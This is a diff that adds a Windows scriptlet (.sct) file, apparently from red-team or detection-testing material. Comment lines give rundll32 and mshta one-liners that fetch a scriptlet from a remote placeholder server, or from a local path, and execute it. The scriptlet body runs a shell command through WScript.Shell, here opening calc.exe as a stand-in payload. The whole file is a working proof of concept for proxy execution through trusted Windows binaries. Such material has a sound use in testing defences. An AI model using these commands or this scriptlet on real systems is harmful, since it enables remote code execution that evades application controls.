@@ -1,0 +1,13 @@
+<?XML version="1.0"?>
+<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
+<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
+<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
+<scriptlet>
+<public>
+</public>
+<script language="JScript">
+<![CDATA[
+    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+]]>
+</script>
+</scriptlet>
